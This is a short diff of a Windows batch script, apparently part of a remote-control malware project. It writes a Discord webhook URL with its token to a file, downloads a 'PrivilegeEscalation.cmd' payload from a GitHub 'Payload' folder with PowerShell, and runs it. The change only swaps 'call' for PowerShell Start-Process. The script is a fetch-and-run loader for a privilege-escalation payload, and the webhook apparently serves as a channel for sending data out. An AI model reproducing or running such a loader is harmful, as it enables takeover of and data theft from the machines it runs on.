@@ -14,7 +14,7 @@ echo https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3
 @REM Download required files
 
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
-call "PrivilegeEscalation.cmd"
+powershell Start-Process -FilePath "PrivilegeEscalation.cmd" -NoNewWindow -Wait
 
 @REM Delete the Discord Webhook file
 del "DiscordWebhookURL.icu"
